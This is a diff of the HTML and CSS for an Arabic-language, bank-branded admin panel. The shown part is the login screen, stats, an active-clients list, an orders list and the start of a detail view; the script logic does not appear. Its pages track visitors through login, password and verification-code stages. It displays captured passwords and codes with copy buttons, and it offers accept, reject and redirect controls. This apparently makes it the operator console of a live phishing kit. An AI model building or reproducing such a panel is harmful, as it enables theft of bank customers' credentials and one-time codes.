@@ -3,233 +3,228 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>لوحة الإدارة</title>
+<title>لوحة التحكم</title>
 <style>
-  :root{--bg:#f0f2f5;--card:#fff;--ink:#1a1a2e;--muted:#6b7280;--line:#e5e7eb;
-    --green:#059669;--red:#dc2626;--orange:#d97706;--blue:#2563eb;--purple:#7c3aed;
-    --sidebar-bg:#111827;--sidebar-w:300px;--topbar-h:60px}
+  :root{--bg:#0f1923;--card:#1a2736;--card-border:#243447;--ink:#e4e9f0;--muted:#7a8a9e;
+    --green:#2ecc71;--red:#e74c3c;--orange:#f39c12;--blue:#3498db;--purple:#9b59b6;
+    --topbar:#15202d;--accent:#2ecc71}
   *{box-sizing:border-box;margin:0;padding:0}
-  html,body{background:var(--bg);color:var(--ink);font-family:"Segoe UI",Tahoma,Arial,sans-serif;height:100%}
+  html,body{background:var(--bg);color:var(--ink);font-family:"Segoe UI",Tahoma,Arial,sans-serif;height:100%;overflow:hidden}
 
   /* === Login === */
-  .login-wrap{display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px;
-    background:linear-gradient(135deg,#111827 0%,#1f2937 50%,#111827 100%)}
-  .login-box{background:#fff;border-radius:24px;padding:48px 40px;width:100%;max-width:420px;
-    box-shadow:0 20px 60px rgba(0,0,0,.3);text-align:center}
-  .login-box h1{font-size:28px;font-weight:800;margin-bottom:6px;color:var(--ink)}
-  .login-box p{color:var(--muted);font-size:14px;margin-bottom:30px}
-  .login-box input{width:100%;padding:16px 20px;border:2px solid var(--line);border-radius:14px;
-    font-size:16px;font-family:inherit;text-align:center;outline:none;margin-bottom:18px;transition:.2s}
-  .login-box input:focus{border-color:var(--blue);box-shadow:0 0 0 3px rgba(37,99,235,.1)}
-  .login-box button{width:100%;padding:16px;background:var(--blue);color:#fff;border:none;
-    border-radius:14px;font-size:16px;font-weight:700;cursor:pointer;font-family:inherit;transition:.2s}
-  .login-box button:hover{background:#1d4ed8}
-  .login-err{color:var(--red);font-size:13px;margin-bottom:12px;display:none}
+  .login-wrap{display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px;background:var(--bg)}
+  .login-box{background:var(--card);border:1px solid var(--card-border);border-radius:20px;padding:44px 36px;width:100%;max-width:400px;
+    box-shadow:0 16px 50px rgba(0,0,0,.4);text-align:center}
+  .login-box h1{font-size:24px;font-weight:800;margin-bottom:6px;color:var(--ink)}
+  .login-box p{color:var(--muted);font-size:13px;margin-bottom:28px}
+  .login-box input{width:100%;padding:14px 18px;border:1.5px solid var(--card-border);border-radius:12px;
+    font-size:15px;font-family:inherit;text-align:center;outline:none;margin-bottom:16px;
+    background:var(--bg);color:var(--ink);transition:.2s}
+  .login-box input:focus{border-color:var(--accent)}
+  .login-box button{width:100%;padding:14px;background:var(--accent);color:#fff;border:none;
+    border-radius:12px;font-size:15px;font-weight:700;cursor:pointer;font-family:inherit;transition:.2s}
+  .login-box button:hover{opacity:.9}
+  .login-err{color:var(--red);font-size:12px;margin-bottom:10px;display:none}
 
   /* === Layout === */
-  .layout{display:none;height:100vh;overflow:hidden}
+  .layout{display:none;flex-direction:column;height:100vh;overflow:hidden}
 
   /* === Top Bar === */
-  .topbar{height:var(--topbar-h);background:#fff;border-bottom:1px solid var(--line);
-    display:flex;align-items:center;justify-content:space-between;padding:0 24px;position:relative;z-index:10}
-  .topbar-right{display:flex;align-items:center;gap:14px}
-  .topbar-right h1{font-size:20px;font-weight:800}
-  .topbar-left{display:flex;align-items:center;gap:10px}
-  .auto-dot{width:8px;height:8px;background:var(--green);border-radius:50%;animation:pulse 1.5s infinite}
-  .auto-label{font-size:12px;color:var(--green);font-weight:600}
-  .btn-refresh{display:flex;align-items:center;gap:6px;padding:8px 16px;background:var(--bg);
-    border:1.5px solid var(--line);border-radius:10px;font-size:12px;font-weight:600;cursor:pointer;
-    font-family:inherit;transition:.2s}
-  .btn-refresh:hover{background:#e5e7eb}
-  .btn-refresh svg{width:14px;height:14px;fill:var(--muted)}
-  .btn-logout{padding:8px 16px;background:#fef2f2;color:var(--red);border:1.5px solid #fecaca;
-    border-radius:10px;font-size:12px;font-weight:600;cursor:pointer;font-family:inherit}
-  .btn-logout:hover{background:#fee2e2}
+  .topbar{height:52px;background:var(--topbar);border-bottom:1px solid var(--card-border);
+    display:flex;align-items:center;justify-content:space-between;padding:0 20px;flex-shrink:0}
+  .topbar-right{display:flex;align-items:center;gap:10px}
+  .topbar-right .logo{font-size:20px}
+  .topbar-right h1{font-size:16px;font-weight:700;color:var(--ink)}
+  .topbar-right .sep{color:var(--muted);font-size:14px}
+  .topbar-left{display:flex;align-items:center;gap:8px}
+  .tb-badge{display:flex;align-items:center;gap:6px;padding:6px 14px;border-radius:20px;
+    font-size:12px;font-weight:600;border:none;cursor:default}
+  .tb-badge.green{background:rgba(46,204,113,.15);color:var(--green)}
+  .tb-badge.blue{background:rgba(52,152,219,.15);color:var(--blue)}
+  .tb-badge .dot{width:7px;height:7px;border-radius:50%;background:currentColor;animation:pulse 1.5s infinite}
+  .tb-btn{padding:6px 14px;border-radius:20px;font-size:12px;font-weight:600;cursor:pointer;
+    font-family:inherit;border:1px solid var(--card-border);background:transparent;color:var(--muted);transition:.15s}
+  .tb-btn:hover{background:var(--card)}
+  .tb-btn.red{border-color:rgba(231,76,60,.3);color:var(--red)}
+  .tb-btn.red:hover{background:rgba(231,76,60,.1)}
+  .tb-admin{display:flex;align-items:center;gap:6px;font-size:12px;color:var(--muted);font-weight:600}
 
-  /* === Body === */
-  .body-wrap{display:flex;height:calc(100vh - var(--topbar-h))}
+  /* === Stats Row === */
+  .stats-row{display:grid;grid-template-columns:repeat(5,1fr);gap:12px;padding:16px 20px;flex-shrink:0}
+  .stat-card{background:var(--card);border:1px solid var(--card-border);border-radius:14px;
+    padding:18px 16px;text-align:center;position:relative;overflow:hidden}
+  .stat-num{font-size:28px;font-weight:800;display:flex;align-items:center;justify-content:center;gap:8px}
+  .stat-num .ico{font-size:22px}
+  .stat-card.s-clients .stat-num{color:#c39bd3}
+  .stat-card.s-visitors .stat-num{color:var(--blue)}
+  .stat-card.s-online .stat-num{color:#5dade2}
+  .stat-card.s-active .stat-num{color:var(--orange)}
+  .stat-card.s-done .stat-num{color:var(--green)}
+  .stat-label{font-size:12px;color:var(--muted);margin-top:6px}
+  .stat-link{font-size:11px;color:var(--accent);margin-top:4px;cursor:pointer}
 
-  /* === Sidebar === */
-  .sidebar{width:var(--sidebar-w);background:var(--sidebar-bg);color:#fff;
-    display:flex;flex-direction:column;overflow:hidden;flex-shrink:0}
-  .sidebar-header{padding:18px 20px;border-bottom:1px solid rgba(255,255,255,.08);
+  /* === Body: 3 columns === */
+  .body-wrap{flex:1;display:flex;overflow:hidden;padding:0 20px 16px;gap:12px}
+
+  /* Column: Active Clients */
+  .col-clients{width:280px;flex-shrink:0;display:flex;flex-direction:column}
+  .col-title{font-size:14px;font-weight:700;padding:12px 0;display:flex;align-items:center;gap:8px}
+  .col-title .dot{width:8px;height:8px;border-radius:50%;background:var(--green);animation:pulse 1.5s infinite}
+  .col-title .cnt{font-size:12px;color:var(--muted);font-weight:400}
+  .clients-list{flex:1;overflow-y:auto;padding-left:4px}
+  .clients-list::-webkit-scrollbar{width:4px}
+  .clients-list::-webkit-scrollbar-thumb{background:var(--card-border);border-radius:4px}
+
+  .cl-card{background:var(--card);border:1px solid var(--card-border);border-radius:12px;
+    padding:12px 14px;margin-bottom:6px;cursor:pointer;transition:.2s}
+  .cl-card:hover{border-color:#3a5068}
+  .cl-card.active{border-color:var(--accent);background:rgba(46,204,113,.06)}
+  .cl-top{display:flex;align-items:center;justify-content:space-between;margin-bottom:4px}
+  .cl-name{font-size:13px;font-weight:600;display:flex;align-items:center;gap:6px}
+  .cl-name .live{width:7px;height:7px;background:var(--green);border-radius:50%;animation:pulse 1.5s infinite}
+  .cl-time{font-size:10px;color:var(--muted)}
+  .cl-page{display:inline-block;font-size:10px;font-weight:600;padding:2px 8px;border-radius:5px;margin-top:2px}
+  .cl-page.p-login{background:rgba(52,152,219,.15);color:#5dade2}
+  .cl-page.p-password{background:rgba(155,89,182,.15);color:#c39bd3}
+  .cl-page.p-waiting{background:rgba(243,156,18,.15);color:#f5b041}
+  .cl-page.p-code{background:rgba(26,188,156,.15);color:#48c9b0}
+  .cl-page.p-code-waiting{background:rgba(243,156,18,.15);color:#f5b041}
+  .cl-page.p-success{background:rgba(46,204,113,.15);color:#58d68d}
+  .cl-page.p-order{background:rgba(93,173,226,.15);color:#5dade2}
+  .cl-page.p-default{background:rgba(255,255,255,.05);color:var(--muted)}
+  .cl-phone{font-size:10px;color:var(--muted);direction:ltr;text-align:right;margin-top:3px}
+
+  .clients-empty{text-align:center;padding:40px 10px;color:var(--muted);font-size:13px}
+  .clients-empty .zzz{font-size:40px;margin-bottom:8px}
+
+  /* Column: Orders */
+  .col-orders{width:320px;flex-shrink:0;display:flex;flex-direction:column;
+    background:var(--card);border:1px solid var(--card-border);border-radius:14px;overflow:hidden}
+  .orders-header{padding:14px 16px;border-bottom:1px solid var(--card-border);
     display:flex;align-items:center;justify-content:space-between}
-  .sidebar-header h2{font-size:15px;font-weight:700;display:flex;align-items:center;gap:8px}
-  .sidebar-count{background:var(--green);color:#fff;font-size:11px;font-weight:700;
-    padding:2px 8px;border-radius:20px;min-width:22px;text-align:center}
-  .sidebar-list{flex:1;overflow-y:auto;padding:8px}
-  .sidebar-list::-webkit-scrollbar{width:4px}
-  .sidebar-list::-webkit-scrollbar-thumb{background:rgba(255,255,255,.15);border-radius:4px}
+  .orders-header h2{font-size:14px;font-weight:700;display:flex;align-items:center;gap:6px}
+  .orders-header h2 .ico{font-size:16px}
+  .search-wrap{padding:10px 14px;border-bottom:1px solid var(--card-border)}
+  .search-wrap input{width:100%;padding:10px 14px;border:1px solid var(--card-border);border-radius:10px;
+    background:var(--bg);color:var(--ink);font-size:13px;font-family:inherit;outline:none}
+  .search-wrap input::placeholder{color:var(--muted)}
+  .search-wrap input:focus{border-color:var(--accent)}
+  .orders-list{flex:1;overflow-y:auto}
+  .orders-list::-webkit-scrollbar{width:4px}
+  .orders-list::-webkit-scrollbar-thumb{background:var(--card-border);border-radius:4px}
 
-  .client-card{padding:14px 16px;border-radius:12px;cursor:pointer;transition:.2s;margin-bottom:4px;
-    border:1.5px solid transparent}
-  .client-card:hover{background:rgba(255,255,255,.06)}
-  .client-card.active{background:rgba(37,99,235,.15);border-color:rgba(37,99,235,.3)}
-  .client-top{display:flex;align-items:center;justify-content:space-between;margin-bottom:6px}
-  .client-name{font-size:14px;font-weight:600;display:flex;align-items:center;gap:8px}
-  .client-name .live-dot{width:8px;height:8px;background:#34d399;border-radius:50%;
-    animation:pulse 1.5s infinite;flex-shrink:0}
-  .client-time{font-size:11px;color:rgba(255,255,255,.4)}
-  .client-page{display:inline-flex;align-items:center;gap:5px;font-size:11px;font-weight:600;
-    padding:3px 10px;border-radius:6px;margin-top:2px}
-  .client-page.p-login{background:rgba(37,99,235,.2);color:#93c5fd}
-  .client-page.p-password{background:rgba(124,58,237,.2);color:#c4b5fd}
-  .client-page.p-waiting{background:rgba(217,119,6,.2);color:#fcd34d}
-  .client-page.p-code{background:rgba(6,182,212,.2);color:#67e8f9}
-  .client-page.p-code-waiting{background:rgba(217,119,6,.2);color:#fcd34d}
-  .client-page.p-success{background:rgba(5,150,105,.2);color:#6ee7b7}
-  .client-page.p-order{background:rgba(99,102,241,.2);color:#a5b4fc}
-  .client-page.p-default{background:rgba(255,255,255,.08);color:rgba(255,255,255,.5)}
-  .client-phone{font-size:11px;color:rgba(255,255,255,.4);direction:ltr;text-align:right;margin-top:3px}
+  .ord-card{padding:12px 16px;border-bottom:1px solid var(--card-border);cursor:pointer;transition:.15s}
+  .ord-card:hover{background:rgba(255,255,255,.03)}
+  .ord-card.active{background:rgba(46,204,113,.06);border-right:3px solid var(--accent)}
+  .ord-top{display:flex;align-items:center;justify-content:space-between;margin-bottom:4px}
+  .ord-name{font-size:13px;font-weight:600}
+  .ord-badge{padding:2px 8px;border-radius:12px;font-size:9px;font-weight:700}
+  .ord-badge.pending{background:rgba(243,156,18,.15);color:#f5b041}
+  .ord-badge.confirmed,.ord-badge.code_confirmed{background:rgba(46,204,113,.15);color:#58d68d}
+  .ord-badge.rejected,.ord-badge.code_rejected{background:rgba(231,76,60,.15);color:#e74c3c}
+  .ord-badge.code_pending{background:rgba(52,152,219,.15);color:#5dade2}
+  .ord-mid{display:flex;align-items:center;gap:12px;margin-top:3px}
+  .ord-phone{font-size:11px;color:var(--muted);direction:ltr}
+  .ord-page{font-size:10px;color:var(--muted);background:rgba(255,255,255,.05);padding:1px 6px;border-radius:4px}
+  .ord-date{font-size:10px;color:var(--muted);margin-right:auto}
 
-  .sidebar-empty{text-align:center;padding:40px 20px;color:rgba(255,255,255,.3);font-size:13px}
+  .orders-empty{text-align:center;padding:40px 10px;color:var(--muted);font-size:13px}
+  .orders-empty .ico{font-size:36px;margin-bottom:8px}
 
-  /* === Main Content === */
-  .main{flex:1;overflow-y:auto;padding:24px}
+  /* Column: Detail */
+  .col-detail{flex:1;display:flex;flex-direction:column;background:var(--card);
+    border:1px solid var(--card-border);border-radius:14px;overflow:hidden}
+  .detail-placeholder{flex:1;display:flex;flex-direction:column;align-items:center;
+    justify-content:center;color:var(--muted);font-size:14px}
+  .detail-placeholder .hand{font-size:50px;margin-bottom:12px}
 
-  /* === Stats === */
-  .stats-row{display:grid;grid-template-columns:repeat(4,1fr);gap:14px;margin-bottom:24px}
-  .stat-card{background:var(--card);border-radius:14px;padding:18px 20px;
-    box-shadow:0 1px 3px rgba(0,0,0,.04);border:1px solid var(--line);position:relative;overflow:hidden}
-  .stat-card::before{content:"";position:absolute;top:0;right:0;width:4px;height:100%}
-  .stat-card.s-active::before{background:var(--green)}
-  .stat-card.s-total::before{background:var(--blue)}
-  .stat-card.s-pending::before{background:var(--orange)}
-  .stat-card.s-confirmed::before{background:var(--green)}
-  .stat-label{font-size:12px;color:var(--muted);font-weight:500;margin-bottom:6px}
-  .stat-num{font-size:28px;font-weight:800;letter-spacing:-1px}
-  .stat-card.s-active .stat-num{color:var(--green)}
-  .stat-card.s-total .stat-num{color:var(--blue)}
-  .stat-card.s-pending .stat-num{color:var(--orange)}
-  .stat-card.s-confirmed .stat-num{color:var(--green)}
-
-  /* === Table === */
-  .table-card{background:var(--card);border-radius:14px;box-shadow:0 1px 3px rgba(0,0,0,.04);
-    border:1px solid var(--line);overflow:hidden}
-  .table-header{padding:18px 20px;border-bottom:1px solid var(--line);display:flex;
-    align-items:center;justify-content:space-between}
-  .table-header h2{font-size:16px;font-weight:700}
-  .table-count{font-size:12px;color:var(--muted);background:var(--bg);padding:3px 10px;border-radius:20px}
-
-  table{width:100%;border-collapse:collapse}
-  thead th{padding:12px 14px;text-align:right;font-size:11px;font-weight:600;color:var(--muted);
-    text-transform:uppercase;letter-spacing:.5px;background:#fafbfc;border-bottom:1px solid var(--line)}
-  tbody tr{border-bottom:1px solid var(--line);transition:.15s;cursor:pointer}
-  tbody tr:last-child{border:none}
-  tbody tr:hover{background:#f0f4ff}
-  tbody td{padding:12px 14px;font-size:13px;vertical-align:middle;white-space:nowrap}
-
-  .td-name{font-weight:600;font-size:13px}
-  .td-phone{font-size:11px;color:var(--muted);direction:ltr;text-align:right;margin-top:1px}
-  .td-cred{font-family:monospace;font-size:12px;direction:ltr;text-align:left;font-weight:600;
-    color:var(--purple);letter-spacing:1px;background:#f5f3ff;padding:3px 8px;border-radius:5px;
-    display:inline-block}
-  .td-cred.code{color:#1565c0;background:#e3f2fd}
-
-  .badge{padding:3px 10px;border-radius:20px;font-size:10px;font-weight:700;display:inline-block}
-  .badge-pending{background:#fef3c7;color:#92400e}
-  .badge-confirmed{background:#d1fae5;color:#065f46}
-  .badge-rejected{background:#fee2e2;color:#991b1b}
-  .badge-code_pending{background:#e0e7ff;color:#3730a3}
-  .badge-code_confirmed{background:#d1fae5;color:#065f46}
-  .badge-code_rejected{background:#fee2e2;color:#991b1b}
-  .badge-page{background:#dbeafe;color:#1e40af;font-size:10px}
-
-  .td-actions{display:flex;gap:4px}
-  .td-actions button{border:none;padding:6px 10px;border-radius:6px;font-size:11px;
-    font-weight:600;cursor:pointer;font-family:inherit;transition:.15s}
-  .btn-delete{background:#fef2f2;color:var(--red)}
-  .btn-delete:hover{background:#fee2e2}
-
-  .empty{text-align:center;padding:60px 20px;color:var(--muted);font-size:14px}
-
-  /* === Detail Panel (slides from left) === */
-  .detail-overlay{position:fixed;inset:0;background:rgba(0,0,0,.4);z-index:200;
-    display:none;backdrop-filter:blur(3px)}
-  .detail-overlay.open{display:block}
-  .detail-panel{position:fixed;top:0;left:0;width:480px;max-width:90vw;height:100vh;
-    background:#fff;z-index:210;box-shadow:-8px 0 30px rgba(0,0,0,.15);
-    transform:translateX(-100%);transition:transform .3s ease;overflow-y:auto;direction:rtl}
-  .detail-panel.open{transform:translateX(0)}
-
-  .dp-header{padding:24px;border-bottom:1px solid var(--line);display:flex;
-    align-items:center;justify-content:space-between;position:sticky;top:0;background:#fff;z-index:5}
-  .dp-header h2{font-size:18px;font-weight:800}
-  .dp-close{width:36px;height:36px;border:none;background:var(--bg);border-radius:10px;
-    font-size:20px;cursor:pointer;color:var(--muted);display:flex;align-items:center;justify-content:center}
-  .dp-close:hover{background:#e5e7eb}
-
-  .dp-body{padding:24px}
-
-  .dp-status{display:flex;align-items:center;gap:10px;margin-bottom:20px;
-    padding:14px 16px;border-radius:12px;background:var(--bg)}
-  .dp-status-dot{width:10px;height:10px;border-radius:50%;flex-shrink:0}
-  .dp-status-dot.pending{background:var(--orange)}
-  .dp-status-dot.confirmed{background:var(--green)}
-  .dp-status-dot.rejected{background:var(--red)}
-  .dp-status-dot.code_pending{background:var(--blue)}
-  .dp-status-dot.code_confirmed{background:var(--green)}
-  .dp-status-dot.code_rejected{background:var(--red)}
-  .dp-status-label{font-size:13px;font-weight:600}
-  .dp-status-page{margin-right:auto;font-size:11px;color:var(--muted);
-    background:#fff;padding:3px 10px;border-radius:6px}
-
-  .dp-section{margin-bottom:20px}
-  .dp-section-title{font-size:12px;font-weight:700;color:var(--muted);text-transform:uppercase;
-    letter-spacing:.5px;margin-bottom:10px;padding-bottom:6px;border-bottom:1px solid var(--line)}
-
-  .dp-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}
-  .dp-item{background:var(--bg);padding:12px 14px;border-radius:10px}
-  .dp-item .lbl{font-size:11px;color:var(--muted);margin-bottom:3px;font-weight:500}
-  .dp-item .val{font-size:14px;font-weight:600;word-break:break-word}
-  .dp-full{grid-column:1/-1}
-
-  .dp-cred{background:var(--bg);border-radius:10px;padding:12px 14px;margin-bottom:8px;
+  .det-header{padding:16px 20px;border-bottom:1px solid var(--card-border);
     display:flex;align-items:center;justify-content:space-between}
-  .dp-cred-info .cred-label{font-size:11px;color:var(--muted);font-weight:500}
-  .dp-cred-info .cred-val{font-family:monospace;font-size:16px;font-weight:700;
-    direction:ltr;letter-spacing:2px;color:var(--purple)}
-  .dp-cred-info .cred-val.code-val{color:#1565c0;letter-spacing:3px;font-size:20px}
-  .dp-copy{display:flex;align-items:center;gap:4px;background:#fff;border:1px solid var(--line);
-    cursor:pointer;padding:6px 10px;border-radius:8px;color:var(--muted);font-size:11px;
+  .det-header h2{font-size:16px;font-weight:700}
+  .det-close{border:none;background:var(--bg);color:var(--muted);width:30px;height:30px;
+    border-radius:8px;font-size:18px;cursor:pointer;display:flex;align-items:center;justify-content:center}
+  .det-close:hover{color:var(--ink)}
+  .det-body{flex:1;overflow-y:auto;padding:20px}
+  .det-body::-webkit-scrollbar{width:4px}
+  .det-body::-webkit-scrollbar-thumb{background:var(--card-border);border-radius:4px}
+
+  .det-status{display:flex;align-items:center;gap:8px;padding:12px 14px;border-radius:10px;
+    background:var(--bg);border:1px solid var(--card-border);margin-bottom:16px}
+  .det-status .dot{width:9px;height:9px;border-radius:50%;flex-shrink:0}
+  .det-status .dot.pending{background:var(--orange)}
+  .det-status .dot.confirmed,.det-status .dot.code_confirmed{background:var(--green)}
+  .det-status .dot.rejected,.det-status .dot.code_rejected{background:var(--red)}
+  .det-status .dot.code_pending{background:var(--blue)}
+  .det-status .lbl{font-size:12px;font-weight:600}
+  .det-status .pg{margin-right:auto;font-size:10px;color:var(--muted);background:var(--card);
+    padding:2px 8px;border-radius:5px}
+
+  .det-section{margin-bottom:18px}
+  .det-section-title{font-size:11px;font-weight:700;color:var(--muted);text-transform:uppercase;
+    letter-spacing:.5px;margin-bottom:8px;padding-bottom:6px;border-bottom:1px solid var(--card-border)}
+
+  .det-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px}
+  .det-item{background:var(--bg);border:1px solid var(--card-border);padding:10px 12px;border-radius:8px}
+  .det-item .l{font-size:10px;color:var(--muted);margin-bottom:2px}
+  .det-item .v{font-size:13px;font-weight:600;word-break:break-word}
+
+  .det-cred{background:var(--bg);border:1px solid var(--card-border);border-radius:8px;
+    padding:10px 12px;margin-bottom:6px;display:flex;align-items:center;justify-content:space-between}
+  .det-cred .cl{font-size:10px;color:var(--muted)}
+  .det-cred .cv{font-family:monospace;font-size:15px;font-weight:700;direction:ltr;letter-spacing:2px;color:#c39bd3}
+  .det-cred .cv.code{color:#5dade2;font-size:18px;letter-spacing:3px}
+  .det-copy{display:flex;align-items:center;gap:4px;background:var(--card);border:1px solid var(--card-border);
+    cursor:pointer;padding:5px 10px;border-radius:6px;color:var(--muted);font-size:11px;
     font-family:inherit;font-weight:600;transition:.15s}
-  .dp-copy:hover{border-color:var(--purple);color:var(--purple);background:#f5f3ff}
-  .dp-copy svg{width:14px;height:14px}
-  .dp-copy.copied{border-color:var(--green);color:var(--green);background:#ecfdf5}
+  .det-copy:hover{border-color:var(--accent);color:var(--accent)}
+  .det-copy svg{width:13px;height:13px}
+  .det-copy.copied{border-color:var(--green);color:var(--green)}
 
-  .dp-actions{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:24px}
-  .dp-actions button{padding:16px;border:none;border-radius:12px;font-size:15px;
+  .det-actions{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-top:18px}
+  .det-actions button{padding:14px;border:none;border-radius:10px;font-size:14px;
     font-weight:700;cursor:pointer;font-family:inherit;transition:.2s}
   .btn-accept{background:var(--green);color:#fff}
-  .btn-accept:hover{background:#047857}
+  .btn-accept:hover{opacity:.85}
   .btn-reject{background:var(--red);color:#fff}
-  .btn-reject:hover{background:#b91c1c}
+  .btn-reject:hover{opacity:.85}
 
-  .dp-redirect{margin-top:16px}
-  .dp-redirect-title{font-size:12px;font-weight:700;color:var(--muted);margin-bottom:8px}
-  .dp-redirect-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px}
-  .dp-redirect-grid button{padding:12px;border:1.5px solid var(--line);background:#fff;
-    border-radius:10px;font-size:12px;font-weight:600;cursor:pointer;font-family:inherit;transition:.2s}
-  .dp-redirect-grid button:hover{background:var(--bg);border-color:var(--blue);color:var(--blue)}
+  .det-redirect{margin-top:14px}
+  .det-redirect-title{font-size:11px;font-weight:700;color:var(--muted);margin-bottom:6px}
+  .det-redirect-grid{display:grid;grid-template-columns:1fr 1fr 1fr;gap:6px}
+  .det-redirect-grid button{padding:10px 6px;border:1px solid var(--card-border);background:var(--bg);
+    border-radius:8px;font-size:11px;font-weight:600;cursor:pointer;font-family:inherit;
+    color:var(--ink);transition:.15s}
+  .det-redirect-grid button:hover{border-color:var(--accent);color:var(--accent)}
+
+  .det-delete{margin-top:14px;text-align:center}
+  .det-delete button{padding:10px 24px;border:1px solid rgba(231,76,60,.3);background:transparent;
+    border-radius:8px;font-size:12px;font-weight:600;cursor:pointer;font-family:inherit;
+    color:var(--red);transition:.15s}
+  .det-delete button:hover{background:rgba(231,76,60,.1)}
 
   @keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
 
-  @media(max-width:900px){
-    .sidebar{display:none}
-    .stats-row{grid-template-columns:repeat(2,1fr)}
-    .detail-panel{width:100vw;max-width:100vw}
-    .dp-grid{grid-template-columns:1fr}
-    .dp-full{grid-column:1}
+  @media(max-width:1100px){
+    .col-clients{width:220px}
+    .col-orders{width:260px}
+  }
+  @media(max-width:800px){
+    .body-wrap{flex-direction:column;overflow-y:auto}
+    .col-clients,.col-orders,.col-detail{width:100%;flex-shrink:0}
+    .col-clients{max-height:200px}
+    .col-orders{max-height:300px}
+    .col-detail{min-height:400px}
+    .stats-row{grid-template-columns:repeat(3,1fr)}
   }
 </style>
 </head>
 <body>
 
-<!-- Login Screen -->
+<!-- Login -->
 <div class="login-wrap" id="loginScreen">
   <div class="login-box">
-    <h1>لوحة الإدارة</h1>
-    <p>أدخل كلمة المرور للوصول إلى لوحة التحكم</p>
+    <h1>لوحة التحكم</h1>
+    <p>أدخل كلمة المرور للوصول</p>
     <div class="login-err" id="loginErr">كلمة المرور غير صحيحة</div>
     <input type="password" id="passInput" placeholder="كلمة المرور" autofocus>
     <button onclick="doLogin()">دخول</button>
@@ -242,78 +237,80 @@
   <!-- Top Bar -->
   <div class="topbar">
     <div class="topbar-right">
-      <h1>لوحة الإدارة</h1>
+      <span class="logo">🏦</span>
+      <h1>لوحة التحكم</h1>
     </div>
     <div class="topbar-left">
-      <div class="auto-dot"></div>
-      <span class="auto-label">تحديث تلقائي</span>
-      <button class="btn-refresh" onclick="loadOrders();loadActiveVisitors()">
-        <svg viewBox="0 0 24 24"><path d="M17.65 6.35A7.96 7.96 0 0 0 12 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08A5.99 5.99 0 0 1 12 18c-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z"/></svg>
-        تحديث
-      </button>
-      <button class="btn-logout" onclick="doLogout()">تسجيل خروج</button>
+      <span class="tb-badge blue">
+        <span>إجمالي الزوار: <strong id="tbVisitors">0</strong></span>
+      </span>
+      <span class="tb-badge green">
+        <span class="dot"></span>
+        <span>الزوار الآن: <strong id="tbOnline">0</strong></span>
+      </span>
+      <span class="tb-admin">Admin 👤</span>
+      <button class="tb-btn red" onclick="doLogout()">خروج</button>
     </div>
   </div>
 
+  <!-- Stats -->
+  <div class="stats-row">
+    <div class="stat-card s-clients">
+      <div class="stat-num"><span class="ico">👥</span> <span id="sTotal">0</span></div>
+      <div class="stat-label">إجمالي العملاء</div>
+    </div>
+    <div class="stat-card s-visitors">
+      <div class="stat-num"><span class="ico">📊</span> <span id="sVisitors">0</span></div>
+      <div class="stat-label">إجمالي الزوار</div>
+    </div>
+    <div class="stat-card s-online">
+      <div class="stat-num"><span class="ico">🌐</span> <span id="sOnline">0</span></div>
+      <div class="stat-label">الزوار الحاليين</div>
+    </div>
+    <div class="stat-card s-active">
+      <div class="stat-num"><span class="ico">⚡</span> <span id="sActive">0</span></div>
+      <div class="stat-label">عملاء نشطين</div>
+    </div>
+    <div class="stat-card s-done">
+      <div class="stat-num"><span class="ico">✅</span> <span id="sDone">0</span></div>
+      <div class="stat-label">مكتملين</div>
+    </div>
+  </div>
+
+  <!-- Body: 3 columns -->
   <div class="body-wrap">
 
-    <!-- Sidebar: Active Clients -->
-    <div class="sidebar">
-      <div class="sidebar-header">
-        <h2>
-          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width:18px;height:18px"><path d="M17 21v-2a4 4 0 00-4-4H5a4 4 0 00-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 00-3-3.87"/><path d="M16 3.13a4 4 0 010 7.75"/></svg>
-          العملاء النشطون
-        </h2>
-        <span class="sidebar-count" id="sidebarCount">0</span>
-      </div>
-      <div class="sidebar-list" id="sidebarList">
-        <div class="sidebar-empty">لا يوجد عملاء نشطون حالياً</div>
+    <!-- Column 1: Active Clients -->
+    <div class="col-clients">
+      <div class="col-title"><span class="dot"></span> العملاء النشطين <span class="cnt" id="activeCount">(0)</span></div>
+      <div class="clients-list" id="clientsList">
+        <div class="clients-empty"><div class="zzz">💤</div>لا يوجد عملاء نشطين</div>
       </div>
     </div>
 
-    <!-- Main -->
-    <div class="main">
-      <!-- Stats -->
-      <div class="stats-row">
-        <div class="stat-card s-active">
-          <div class="stat-label">نشط الآن</div>
-          <div class="stat-num" id="sActive">0</div>
-        </div>
-        <div class="stat-card s-total">
-          <div class="stat-label">إجمالي الطلبات</div>
-          <div class="stat-num" id="sTotal">0</div>
-        </div>
-        <div class="stat-card s-pending">
-          <div class="stat-label">قيد الانتظار</div>
-          <div class="stat-num" id="sPending">0</div>
-        </div>
-        <div class="stat-card s-confirmed">
-          <div class="stat-label">مقبول</div>
-          <div class="stat-num" id="sConfirmed">0</div>
-        </div>
+    <!-- Column 2: Orders List -->
+    <div class="col-orders">
+      <div class="orders-header">
+        <h2><span class="ico">📋</span> جميع الطلبات <span style="color:var(--muted);font-weight:400" id="ordersCount">(0)</span></h2>
       </div>
-
-      <!-- Orders Table -->
-      <div class="table-card">
-        <div class="table-header">
-          <h2>جميع الطلبات</h2>
-          <span class="table-count" id="tableCount">0 طلب</span>
-        </div>
-        <div id="ordersList"></div>
+      <div class="search-wrap">
+        <input type="text" id="searchInput" placeholder="🔍 بحث بالاسم أو الهاتف..." oninput="filterOrders()">
+      </div>
+      <div class="orders-list" id="ordersList">
+        <div class="orders-empty"><div class="ico">📦</div>لا توجد طلبات</div>
       </div>
     </div>
 
-  </div>
-</div>
+    <!-- Column 3: Detail -->
+    <div class="col-detail" id="colDetail">
